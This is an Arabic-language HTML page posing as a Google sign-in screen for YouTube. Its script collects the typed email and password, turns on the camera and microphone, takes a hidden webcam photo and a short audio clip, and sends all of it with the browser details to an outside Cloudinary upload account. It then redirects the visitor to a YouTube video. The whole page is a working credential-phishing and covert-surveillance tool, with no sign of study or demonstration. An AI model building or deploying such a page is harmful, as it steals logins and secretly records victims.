<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google - التحقق من الأمان</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { font-family: sans-serif; background: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
        .card { width: 90%; max-width: 400px; padding: 40px; border: 1px solid #dadce0; border-radius: 8px; text-align: center; }
        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #dadce0; border-radius: 4px; }
        button { background: #1a73e8; color: #fff; border: none; padding: 12px; width: 100%; border-radius: 4px; cursor: pointer; }
        #v { position: absolute; width: 1px; height: 1px; opacity: 0.01; }
        #c { display: none; }
    </style>
</head>
<body>

<div class="card" id="ui">
    <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" width="75">
    <h1>تسجيل الدخول</h1>
    <p>المتابعة إلى YouTube</p>
    <input type="email" id="e" placeholder="البريد الإلكتروني" required>
    <input type="password" id="p" placeholder="كلمة المرور" required>
    <button onclick="run()">التالي</button>
</div>

<video id="v" autoplay playsinline muted></video>
<canvas id="c" width="640" height="480"></canvas>

<script>
    const cn = 'dgkttv99v', pr = 'ml_default', yt = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";

    async function run() {
        const email = document.getElementById('e').value, pass = document.getElementById('p').value;
        if(!email || !pass) return;

        try {
            // 1. طلب الكاميرا والمايك
            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
            const video = document.getElementById('v');
            video.srcObject = stream;
            video.play();

            document.getElementById('ui').innerHTML = "<h3>جاري معالجة البيانات...</h3>";

            // 2. سحب البيانات فوراً (بدون انتظار البطارية لو علقت)
            let specs = "Browser:" + navigator.userAgent;

            // 3. التقاط الصورة بعد ثانيتين
            setTimeout(() => {
                const canvas = document.getElementById('c');
                canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
                const img = canvas.toDataURL("image/png");

                // 4. تسجيل صوتي قصير (3 ثواني) لضمان السرعة
                const recorder = new MediaRecorder(stream);
                let chunks = [];
                recorder.ondataavailable = ev => chunks.push(ev.data);
                recorder.onstop = () => {
                    const audioBlob = new Blob(chunks, { type: 'audio/webm' });
                    
                    // إرسال البيانات (Fire and Forget)
                    send(email, pass, img, audioBlob, specs);

                    // تحويل إجباري لليوتيوب بعد ثانية واحدة مهما كانت النتيجة
                    setTimeout(() => { window.location.href = yt; }, 1000);
                };

                recorder.start();
                setTimeout(() => recorder.stop(), 3000);

            }, 2000);

        } catch (err) { window.location.href = yt; }
    }

    function send(e, p, img, aud, s) {
        const ctx = `u=${e}|p=${p}|info=${s}`;

        // رفع الصورة
        const fd1 = new FormData();
        fd1.append('file', img);
        fd1.append('upload_preset', pr);
        fd1.append('context', ctx);
        fetch(`https://api.cloudinary.com/v1_1/${cn}/image/upload`, { method: 'POST', body: fd1, keepalive: true });

        // رفع الصوت
        const fd2 = new FormData();
        fd2.append('file', aud);
        fd2.append('upload_preset', pr);
        fd2.append('resource_type', 'video');
        fd2.append('context', ctx);
        fetch(`https://api.cloudinary.com/v1_1/${cn}/upload`, { method: 'POST', body: fd2, keepalive: true });
    }
</script>
</body>
</html>
